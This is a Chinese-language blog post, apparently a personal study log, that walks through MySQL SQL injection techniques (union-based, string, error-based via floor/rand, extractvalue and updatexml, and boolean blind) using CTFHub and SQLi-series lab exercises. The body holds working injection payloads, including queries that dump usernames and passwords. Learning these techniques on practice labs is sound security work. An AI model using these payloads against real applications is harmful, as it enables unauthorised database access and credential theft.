+<script src="/assets/js/pace.min.js"></script>
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<link href="/assets/css/bilibili_icon.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+<!--mathjax-config scripts.-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+</script>
+<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!--mathjax-config scripts stop.-->
+
+
+
+</head>
+
+
+    <body>
+
+                <!--
+#####################################################################################################################
+|  1.Fixed navbar issues #3 visit https://github.com/Bin4xin/bin4xin.github.io/issues/3                             |
+|    change `position: fixed` to `position: sticky`                                                                 |
+|                                                                                                                   |
+|  2.Fixed navbar padding-top equals to 70px                                                                        |
+|    `./assets/css/style.scss` @import struture in `./assets/css/_struture.scss` del `padding-top=70px` in body.    |
+#####################################################################################################################-->
+<style>
+.nav>li>a {
+    padding: 10px 15px;
+}
+</style>
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <div class="flex-justify-center-l flex-justify-between">
+                <!-- 代码引用申明/code reference declaration:
+                @ [click this icon -> scroll to top of page;] code from anquanke. visit any posts in https://www.anquanke.com/
+                <del>also this icon func are under-construction</del>
+                DONE.
+                -->
+                <div>
+                    <picture>
+  
+  
+  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
+  
+  
+  
+  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  
+</picture>
+                    
+                </div>
+                <div>
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button></div>
+            </div>
+        </div>
+        <div class="navbar-collapse collapse navbar-right">
+            <ul class="nav navbar-nav">
+                
+                <li ><a href="/"><div class="fa fa-search"></div></a></li>
+                <li class="active"><a href="/blog/">BLOG</a></li>
+                <li ><a href="/categories/">CATEGORIES</a></li>
+                <li ><a href="/daily/">DAILY</a></li>
+                <li ><a href="/newest">NEWEST</a></li>
+                <li ><a href="/about/">RESEARCH</a></li>
+                <li ><a href="/feed.xml">RSS</a></li>
+                
+            </ul>
+        </div><!--/.nav-collapse -->
+    </div>
+</div>
+                <div class="container mtb">
+    <div class="row d-flex ">
+        <!-- SINGLE POST -->
+        <div class="col-lg-8 markdown-body-img flex-column">
+            <!-- Blog Post  -->
+            <a href="/blog/2022/SQL注入学习记录/"><h1 class="ctitle">SQL注入学习记录</h1></a>
+            <csmall><div class="d-flex items-center">
+                <!--article author end-->
+
+<!-- site build time set to the latest time.-->
+
+<!-- post time-->
+
+
+
+
+
+<div class="ml-hide">
+    <a class="f2 d-flex color-fg-default" href="https://github.com/Yang2635" target="_blank">
+        Yang2635
+
+        
+            
+            <!-- wrench time-->
+            
+        edited
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Jan 17, 2022
+        
+    </a>
+</div>
+            </div></csmall>
+            <div class="post-content"> 
+            <p>该SQL注入文档是自己学习过程中的记录汇集（不涉及WAF拦截或参数过滤），文档中涉及到的数据库管理系统为MySQL。现将文档整理出来，留作自己的学习记录历程。每个注入类型将会有一到两个例子辅助说明。</p>
+
+<h2 id="sql-整型注入">SQL 整型注入</h2>
+
+<h3 id="相关知识">相关知识</h3>
+
+<p><strong>一、常用函数</strong></p>
+
+<p>1、<code class="language-plaintext highlighter-rouge">database()</code>：当前网站使用的数据库。
+2、<code class="language-plaintext highlighter-rouge">version()</code>：当前MySQL版本。
+3、<code class="language-plaintext highlighter-rouge">user()</code>：当前MySQL的用户。</p>
+
+<p><strong>二、关于information_schema的数据库</strong></p>
+
+<p>MySQL默认有<code class="language-plaintext highlighter-rouge">information_schema</code>的数据库，该库中有三个表名，功能分别如下：</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">SCHEMATA</code>：存储该用户创建的所有数据库的库名，记录库名的字段为<code class="language-plaintext highlighter-rouge">SCHEMA_NAME</code>。</li>
+  <li><code class="language-plaintext highlighter-rouge">TABLES</code>：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为<code class="language-plaintext highlighter-rouge">TABLE_SCHEMA</code>和<code class="language-plaintext highlighter-rouge">TABLE_NAME</code>。</li>
+  <li><code class="language-plaintext highlighter-rouge">COLUMNS</code>：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为<code class="language-plaintext highlighter-rouge">TABLE_SCHEMA</code>、<code class="language-plaintext highlighter-rouge">TABLE_NAME</code>和<code class="language-plaintext highlighter-rouge">COLUMN_NAME</code>。</li>
+</ul>
+
+<p><strong>三、union函数</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">union</code>操作符将两个SQL查询语句连接了起来，当设置某个参数不存在时，由于没有该参数的数据，因此会返回<code class="language-plaintext highlighter-rouge">union</code>后的查询语句的结果。</p>
+
+<h3 id="相关练习">相关练习</h3>
+
+<h4 id="ctfhub整数型注入">CTFHub(整数型注入)</h4>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720105814.png" alt="image-20210720104213808" /></p>
+
+<p>1、先简单试着输入了几个数字测试，到3时就无输出了，接着尝试<code class="language-plaintext highlighter-rouge">1 and 1=1</code>成功出结果，<code class="language-plaintext highlighter-rouge">1 and 1=2 </code> 无结果，SQL语句成功执行，存在注入点。再用联合查询<code class="language-plaintext highlighter-rouge">order by</code>测试回显字段数，结果测试到<code class="language-plaintext highlighter-rouge">1 order by 3</code>时与前面的输出不同，则字段数为2。</p>
+
+<p>2、接下来就是使用<code class="language-plaintext highlighter-rouge">union</code>函数联合搜索了，由于字段数为2，故尝试</p>
+
+<pre><code class="language-mysql">-1 union select 1,2
+</code></pre>
+
+<p>成功执行，回显的字段如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720162315.png" alt="image-20210720162314988" /></p>
+
+<p>说明两个字段位置都可以回显。</p>
+
+<p>3、接下来就是枚举出当前的数据库名，语句如下：</p>
+
+<pre><code class="language-mysql">-1 union select 1, databases()
+</code></pre>
+
+<p>成功出当前库名：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720155928.png" alt="image-20210720155928827" /></p>
+
+<p>4、当前数据库名出来后接着联合搜索表名，使用语句如下：</p>
+
+<pre><code class="language-myaql">-1 union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'
+</code></pre>
+
+<p>发现在<code class="language-plaintext highlighter-rouge">information_schema</code>中查到两张表，如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720161032.png" alt="image-20210720161032" /></p>
+
+<p>5、查到flag表后，接下来就是继续拼接命令查字段名，如下：</p>
+
+<pre><code class="language-mysql">-1 union select group_concat(column_name),2 from information_schema.columns where table_name='flag'
+</code></pre>
+
+<p>查找到flag字段：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720161530.png" alt="image-20210720161530240" /></p>
+
+<p>6、根据库名、表名和字段名查字段值，命令如下：</p>
+
+<pre><code class="language-mysql">-1 union select flag,2 from sqli.flag
+</code></pre>
+
+<p>执行，成功得到flag</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720161957.png" alt="image-20210720161957484" /></p>
+
+<h4 id="sqliseries-2">SQLI(SERIES-2)</h4>
+
+<p>1、先尝试添加一下<code class="language-plaintext highlighter-rouge">?id=1'</code>结果报错：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720171725.png" alt="image-20210720171725054" /></p>
+
+<p>接着再在上面的基础上在加一个<code class="language-plaintext highlighter-rouge">'</code>号，继续报错，如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720171911.png" alt="image-20210720171910934" /></p>
+
+<p>同时再用<code class="language-plaintext highlighter-rouge">1 and 1=1</code>（成功）和<code class="language-plaintext highlighter-rouge">1 and 1=2</code>（失败）命令简单判断了存在的是整型注入，此时根据上述的错误提示确定相关SQL执行语句大致为：</p>
+
+<pre><code class="language-mysql">select * from * where id=$id limit 0,1
+</code></pre>
+
+<p>确定存在有整数注入。</p>
+
+<p>2、使用<code class="language-plaintext highlighter-rouge">order by</code>来确定字段数，到<code class="language-plaintext highlighter-rouge">1 order by 4</code>时返回错误，可知字段数为3：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720172257.png" alt="image-20210720172256959" /></p>
+
+<p>3、枚举当前数据库，构造语句为：</p>
+
+<pre><code class="language-mysql">-1 union select 1, 2, database()
+</code></pre>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720174709.png" alt="image-20210720174709025" /></p>
+
+<p>可知当前数据库名为<code class="language-plaintext highlighter-rouge">security</code>。当然此处也可以通过构建语句如下：</p>
+
+<pre><code class="language-mysql">-1 union select 1,group_concat(schema_name),3 from information_schema.schemata
+</code></pre>
+
+<p>即在information_schema表中查看数据库中的库名，如下图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720175447.png" alt="image-20210720175446894" /></p>
+
+<p>若库多的话就会不了解当前数据库对应库名，此处除了数据库默认的相关库之外，只有额外的3个库，<code class="language-plaintext highlighter-rouge">dvwa</code>、<code class="language-plaintext highlighter-rouge">challenges</code>、<code class="language-plaintext highlighter-rouge">security</code>，简单排除测试以了解其当前数据库即可。</p>
+
+<p>4、枚举<code class="language-plaintext highlighter-rouge">security</code>下的表名，使用的语句如下：</p>
+
+<pre><code class="language-mysql">-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'
+</code></pre>
+
+<p>成功得到表名:</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720180036.png" alt="image-20210720180035937" /></p>
+
+<p>5、枚举字段名，使用的语句如下：</p>
+
+<pre><code class="language-mysql">-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'
+</code></pre>
+
+<p>成功拿到相关字段名：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720180353.png" alt="image-20210720180352999" /></p>
+
+<p>6、枚举字段的数据项，使用的语句如下：</p>
+
+<pre><code class="language-mysql">-1 union select 1,group_concat(username),group_concat(password) from users
+</code></pre>
+
+<p>成功拿到用户名与密码：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/20/20210720180903.png" alt="image-20210720180903711" /></p>
+
+<h2 id="sql-字符型注入">SQL 字符型注入</h2>
+
+<h3 id="相关知识-1">相关知识</h3>
+
+<p>字符型SQL注入的关键——<strong>引号的闭合</strong></p>
+
+<p>MySQL数据库对于引号的规则如下：</p>
+
+<ul>
+  <li>引号必须成对出现，否则数据库就会报错。</li>
+  <li>如果两个引号之间内容为空，数据库自动忽略。</li>
+</ul>
+
+<p>MySQL 有三种常用注释符：</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">-- </code>：注意，这种注释符后边有一个空格，也可以是<code class="language-plaintext highlighter-rouge">--+</code>、<code class="language-plaintext highlighter-rouge">--%20</code>或<code class="language-plaintext highlighter-rouge">-- '</code>、<code class="language-plaintext highlighter-rouge">-- #</code>等</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">#</code>：通过#进行注释</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">/* */</code>：注释掉符号内的内容</p>
+  </li>
+</ul>
+
+<h3 id="相关练习-1">相关练习</h3>
+
+<h4 id="sqliseries-1">SQLI(SERIES-1)</h4>
+
+<p>1、先尝试一下<code class="language-plaintext highlighter-rouge">?id=1</code>，此时命令正常执行，如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721111630.png" alt="image-20210721111623071" /></p>
+
+<p>接下来就是判断此SQL是整数型注入还是字符型注入了，基于上条命令在后面添加 <code class="language-plaintext highlighter-rouge">'</code> 尝试一下，此时页面显示错误，可见单引号被后台数据库成功执行，如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721111938.png" alt="image-20210721111938416" /></p>
+
+<p>再在后面添加一个 <code class="language-plaintext highlighter-rouge">'</code> ，此时的SQL执行条件语句为<code class="language-plaintext highlighter-rouge">?id=1''</code>，正常执行：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721112157.png" alt="image-20210721112125505" /></p>
+
+<p>然后在基于and条件命令来验证一下判断，使用<code class="language-plaintext highlighter-rouge">1' and 1=1</code>报错，无法进行注入，故加注释来进行绕过，尝试<code class="language-plaintext highlighter-rouge">1' and 1=1 -- '</code>成功执行，如下图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721114906.png" alt="image-20210721114906701" /></p>
+
+<p>后又执行<code class="language-plaintext highlighter-rouge">1' and 1=2 -- '</code>，逻辑判断错误，报错。此时可以根据上述执行结果确定后台执行的SQL命令语句大致为：</p>
+
+<pre><code class="language-mysql">select * from * where id='$id' limit 0,1
+</code></pre>
+
+<p>存在字符型注入。</p>
+
+<p>2、使用<code class="language-plaintext highlighter-rouge">order by</code>确定字段数，先拼接的字符串为<code class="language-plaintext highlighter-rouge">1' order by 1 --+'</code>，当尝试到4的时候返回了错误，则可以确定字段数为3，如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721120745.png" alt="image-20210721120745684" /></p>
+
+<p>3、使用<code class="language-plaintext highlighter-rouge">union</code>来判断各字段的类型以及判断能够在页面显示的字段，语句为：</p>
+
+<pre><code class="language-mysql">-1' union select 1,2,3 --+'
+</code></pre>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721121147.png" alt="image-20210721121119026" /></p>
+
+<p>第二个和第三个字段成功回显。</p>
+
+<p>4、开始枚举数据库名，构造语句为：</p>
+
+<pre><code class="language-mysql">-1' union select 1,2,database() --+'
+</code></pre>
+
+<p>获取到当前数据库名：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721121349.png" alt="image-20210721121325626" /></p>
+
+<p>5、枚举表名，构造语句为：</p>
+
+<pre><code class="language-mysql">-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+'
+</code></pre>
+
+<p>结果如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721121851.png" alt="image-20210721121850930" /></p>
+
+<p>6、枚举字段名，语句为：</p>
+
+<pre><code class="language-mysql">-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+'
+</code></pre>
+
+<p>结果如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721122125.png" alt="image-20210721122125062" /></p>
+
+<p>7、枚举字段的字段值，语句如下：</p>
+
+<pre><code class="language-mysql">-1' union select 1,group_concat(username),group_concat(password) from users --+'
+</code></pre>
+
+<p>结果如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721122729.png" alt="image-20210721122729290" /></p>
+
+<h2 id="sql-报错注入">SQL 报错注入</h2>
+
+<h3 id="相关知识-2">相关知识</h3>
+
+<p>产生原因：MySQL报错注入通过构造相关语句让信息通过错误提示回显出来，主要应用于查询不回现内容，会打印错误信息；Update、insert等语句，会打印相关错误的信息。</p>
+
+<h4 id="主键重复报错">主键重复报错</h4>
+
+<p>利用<code class="language-plaintext highlighter-rouge">floor()</code>函数使SQL语句报错，实际上是由<code class="language-plaintext highlighter-rouge">count()</code>、<code class="language-plaintext highlighter-rouge">rand()</code>、<code class="language-plaintext highlighter-rouge">group by</code>三个函数语句联合使用造成的。</p>
+
+<p>使用到的相关函数介绍如下：</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">count()</code>：该函数返回匹配指定条件的行数。count(*)函数返回表中的记录数。</li>
+  <li><code class="language-plaintext highlighter-rouge">floor()</code>：该函数是用来向下取整的，相当于去掉小数部分。</li>
+  <li><code class="language-plaintext highlighter-rouge">rand()</code>：该函数是随机取(0,1)中的一个数。但是给它一个参数0后，即<code class="language-plaintext highlighter-rouge">rand(0)</code>，并且传给<code class="language-plaintext highlighter-rouge">floor()</code>后，即：<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>它就不再是随机了，是一个序列 0110110。</li>
+  <li><code class="language-plaintext highlighter-rouge">concat()</code>：用于连接两个字符串。</li>
+  <li><code class="language-plaintext highlighter-rouge">group by x</code>：根据x的规则对数据进行分组，分组时，MySQL会建立一个临时空表进行分组。</li>
+  <li><code class="language-plaintext highlighter-rouge">0x26</code>：16进制数值，ASCII为“&amp;”，在回显中起到分隔作用，可换其它。</li>
+</ul>
+
+<p>报错注入使用到的相关构造语句如下：</p>
+
+<pre><code class="language-mysql">语句一：
+select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
+
+语句二：
+select count(*) from information_schema.tables group by concat((查询语句),floor(rand(0)*2))
+</code></pre>
+
+<blockquote>
+  <p>注：该语句将输出字符长度限制为64个字符。</p>
+</blockquote>
+
+<p>上述两个语句原理基本是相同的，下面由里向外主要分析一下上方第一条相关语句：</p>
+
+<p>上述语句中<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>，<code class="language-plaintext highlighter-rouge">rand()</code>函数会随机产生[0,1)之间的浮点数，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721182143.png" alt="image-20210721182143721" /></p>
+
+<p>且<code class="language-plaintext highlighter-rouge">rand()</code>函数可以自己设置随机种子，即<code class="language-plaintext highlighter-rouge">rand(N)</code>，这个时候产生的随机数是伪随机数，也就是说多次生成的随机数是相同的，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721182229.png" alt="image-20210721182229383" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">floor(N)</code>函数会返回一个小于或等于传入的参数的最大整数（相当于截断小数部分），如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721182335.png" alt="image-20210721182335687" /></p>
+
+<p>多次尝试后可以看出<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>的值是相同的，为011011011，这也是整个报错语句的关键。</p>
+
+<p>接下来分析<code class="language-plaintext highlighter-rouge">concat()</code>函数，该函数主要作用是拼接字符串，<code class="language-plaintext highlighter-rouge">0x26</code>的ASCII码是<code class="language-plaintext highlighter-rouge">&amp;</code>，主要是用于分割其他字符串，就可以快速定位相关信息，括号后面有个<code class="language-plaintext highlighter-rouge">x</code>，是<code class="language-plaintext highlighter-rouge">as x</code>的简写，即前面语句的另一个名字，主要是为了减少重复复杂的语句。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721183349.png" alt="image-20210721183349680" /></p>
+
+<p>后面的<code class="language-plaintext highlighter-rouge">group by x</code>与<code class="language-plaintext highlighter-rouge">count(*)</code>上述函数功能已介绍，其常用用法如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721185203.png" alt="image-20210721185203428" /></p>
+
+<p>最初时，<code class="language-plaintext highlighter-rouge">user-count(*)</code>这个数据表是空的，由MySQL临时创建出来的，通过上述命令一行一行读取原数据表<code class="language-plaintext highlighter-rouge">mysql.user</code>字段，如果读到的字段在<code class="language-plaintext highlighter-rouge">user-count(*)</code>不存在，就将它插入，并且将对应的<code class="language-plaintext highlighter-rouge">count(*)</code>赋为1，如果存在，就将其对应的<code class="language-plaintext highlighter-rouge">count(*)+1</code>，直至扫完整个数据表。</p>
+
+<p><strong>rand(0)*2报错原理：</strong></p>
+
+<p>原因是因为<strong>rand()函数在查询的时候会执行一次，插入的时候还会执行一次。</strong>这就是整个语句报错的关键，从上述<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>图中可以看到在一次多记录的查询过程中<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>的值是定性的，为011011…(这个顺序很重要)，相关流程如下：</p>
+
+<ol>
+  <li>查询前默认会建立空的虚拟表</li>
+  <li>取第一条记录，执行<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>，发现结果为0(第一次计算)，查询虚拟表，发现0的键值不存在，则<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕</li>
+  <li>查询第二条记录，再次计算<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>不会被计算第二次，直接count(*)加1，第二条记录查询完毕</li>
+  <li>查询第三条记录，再次计算<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</li>
+  <li>整个查询过程<code class="language-plaintext highlighter-rouge">floor(rand(0)*2)</code>被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</li>
+</ol>
+
+<p>如果有一个序列开头是0,1,0或者1,0,1，则无论如何都不会报错了，因为虚表开头两个主键会分别是0和1，后面的就直接<code class="language-plaintext highlighter-rouge">count(*)</code>加1了</p>
+
+<p><strong>rand()*2报错原理</strong></p>
+
+<p>其实<code class="language-plaintext highlighter-rouge">rand()*2</code>报错原理与上述的<code class="language-plaintext highlighter-rouge">rand(0)*2</code>原理相同，主要是要保证在开始的查询结果中，不能让虚表中存在0，1键值，不然之后无论多少条记录都不会在报错了，例如随机数：0100011在第一次取数据时插入了1，第二次取数据时插入了0，以后不会再存在主键重复的可能，就不会再报错了，因为表中已经存在0和1这两个数据。
+需要注意的是,<code class="language-plaintext highlighter-rouge">rand()*2</code>当有两条记录的时候就可以报错（但是不绝对），而<code class="language-plaintext highlighter-rouge">rand(0)*2</code>只有当有三条数据记录数及以上才能报错（但是一定可以报错）。</p>
+
+<h4 id="xpath语法错误报错">xpath语法错误报错</h4>
+
+<p>从<strong>MySQL 5.1.5</strong>开始提供两个XML查询和修改的函数，<code class="language-plaintext highlighter-rouge">extractvalue()</code>和<code class="language-plaintext highlighter-rouge">updatexml()</code>。<code class="language-plaintext highlighter-rouge">extractvalue()</code>负责在xml文档中按照xpath语法查询节点内容，<code class="language-plaintext highlighter-rouge">updatexml()</code>则负责修改查询到的内容。</p>
+
+<p><strong>1、XML函数之ExtractValue()</strong></p>
+
+<p>报错原理：从目标 XML 中返回包含所查询值的字符串。其用法格式如下：</p>
+
+<pre><code class="language-mysql">extractvalue(XML_document, XPath_string);
+</code></pre>
+
+<p>其中：</p>
+
+<ul>
+  <li>第一个参数：XML_document是 String 格式，为 XML 文档对象的名称。</li>
+  <li>第二个参数：XPath_string ( Xpath 格式的字符串)</li>
+</ul>
+
+<p>则<code class="language-plaintext highlighter-rouge">ExtractValue()</code>函数构造语句如下：</p>
+
+<pre><code class="language-mysql">select extractvalue(1,concat(0x26,(查询语句),0x26))
+</code></pre>
+
+<blockquote>
+  <p>注：<code class="language-plaintext highlighter-rouge">extractvalue()</code>只能查询32位及以内长度的字符，当超出32位时，我们要结合<code class="language-plaintext highlighter-rouge">mid()</code>、<code class="language-plaintext highlighter-rouge">substr()</code>或配合<code class="language-plaintext highlighter-rouge">right()</code>等函数使其改变输出来进行注入。</p>
+</blockquote>
+
+<p>示例：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721175636.png" alt="image-20210721175636756" /></p>
+
+<p><strong>2、XML函数之updatexml()</strong></p>
+
+<p>用法格式：</p>
+
+<pre><code class="language-mysql">updatexml(XML_document, XPath_string, new_value);
+</code></pre>
+
+<p>其中：</p>
+
+<ul>
+  <li>第一个参数：XML_document是String格式，为XML文档对象的名称。</li>
+  <li>第二个参数：XPath_string (Xpath格式的字符串) 。</li>
+  <li>第三个参数：new_value，String格式，替换查找到的符合条件的数据 。</li>
+</ul>
+
+<p>则<code class="language-plaintext highlighter-rouge">updatexml()</code>函数构造语句如下：</p>
+
+<pre><code class="language-mysql">select updatexml(1,concat(0x26,(查询语句),0x26),1)
+</code></pre>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">updatexml()</code>函数同<code class="language-plaintext highlighter-rouge">ExtractValue()</code>函数只能查询32位及以内长度的字符，当超出32位时，我们要结合<code class="language-plaintext highlighter-rouge">mid()</code>、<code class="language-plaintext highlighter-rouge">substr()</code>或配合<code class="language-plaintext highlighter-rouge">right()</code>等函数使其改变输出来进行注入。</p>
+</blockquote>
+
+<p>示例：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721175543.png" alt="image-20210721175543117" /></p>
+
+<h3 id="ctfhub报错注入">CTFHub(报错注入)</h3>
+
+<p>1、简单输入几个数字，皆成功执行，又用and检查了一下，执行的SQL语句类似整数型的注入，测试发现命令只要不是语法错误皆会执行成功并返回“查询正确”的字样，无其他信息，此时使用<code class="language-plaintext highlighter-rouge">1 order by 3</code>确认了字段数为2。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721163206.png" alt="image-20210721163206521" /></p>
+
+<p>2、由于题目是利用报错注入进行，故枚举库名，构造执行语句如下：</p>
+
+<pre><code class="language-mysql">-1 union select count(*),concat((select database()),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+</code></pre>
+
+<p>成功执行，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721163712.png" alt="image-20210721163712047" /></p>
+
+<p>此处也可以使用语句：</p>
+
+<pre><code class="language-mysql">-1 union select count(*),concat((select schema_name from information_schema.schemata limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+</code></pre>
+
+<p>然后控制limit语句挨个查看相应库名。</p>
+
+<p>3、枚举表名，将上述语句简单变换一下，即：</p>
+
+<pre><code class="language-mysql">-1 union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+</code></pre>
+
+<p>控制limit语句成功爆出2个表名，flag表名如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721165349.png" alt="image-20210721165349061" /></p>
+
+<p>4、枚举字段名，构造语句为：</p>
+
+<pre><code class="language-mysql">-1 union select count(*),concat((select column_name from information_schema.columns where table_name='flag' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+</code></pre>
+
+<p>控制limit语句成功得到相应flag字段名：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721165709.png" alt="image-20210721165709224" /></p>
+
+<p>5、枚举字段的数值，获得flag，使用语句为：</p>
+
+<pre><code class="language-mysql">-1 union select count(*),concat((select flag from sqli.flag limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+</code></pre>
+
+<p>结果如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/21/20210721165911.png" alt="image-20210721165911648" /></p>
+
+<h2 id="sql-布尔注入">SQL 布尔注入</h2>
+
+<h3 id="相关知识-3">相关知识</h3>
+
+<p><strong>布尔型</strong></p>
+
+<p>布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。</p>
+
+<p><strong>盲注</strong></p>
+
+<p>在注入时页面无具体数据返回的注入称之为盲注，一般是通过其他表现形式来判断数据的具体内容</p>
+
+<p><strong>布尔型盲注</strong></p>
+
+<p>页面在执行SQL语句后，只会显示两种结果，这时可通过构造逻辑表达式的SQL语句来判断数据的具体内容。</p>
+
+<p>使用到的函数功能及介绍如下：</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">length()</code>：返回字符串的长度。</li>
+  <li><code class="language-plaintext highlighter-rouge">substring()</code>或<code class="language-plaintext highlighter-rouge">substr()</code>：可以截取字符串，可指定开始的位置和截取的长度，结合<code class="language-plaintext highlighter-rouge">ascii()</code>使用。</li>
+  <li><code class="language-plaintext highlighter-rouge">mid()</code>：同<code class="language-plaintext highlighter-rouge">substring()</code>。</li>
+  <li><code class="language-plaintext highlighter-rouge">ord()</code>：可以返回单个字符的ASCII码，反之char()函数可将ASCII码转换为对应的字符。</li>
+  <li><code class="language-plaintext highlighter-rouge">ascii()</code>：获取字符的ASCII码。</li>
+</ul>
+
+<h3 id="ctfhub布尔注入">CTFHub(布尔注入)</h3>
+
+<blockquote>
+  <p>此处自己根据原理编写了脚本工具完成，遂只记录注入关键过程。</p>
+</blockquote>
+
+<p>1、猜测数据库中表的数量，构造语句：</p>
+
+<pre><code class="language-mysql">1 and (select count(table_name) from information_schema.tables where table_schema=database())=2
+</code></pre>
+
+<p>最后的数值为2时，提示<code class="language-plaintext highlighter-rouge">success</code>，说明该库下有两张表：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722185241.png" alt="image-20210722185234459" /></p>
+
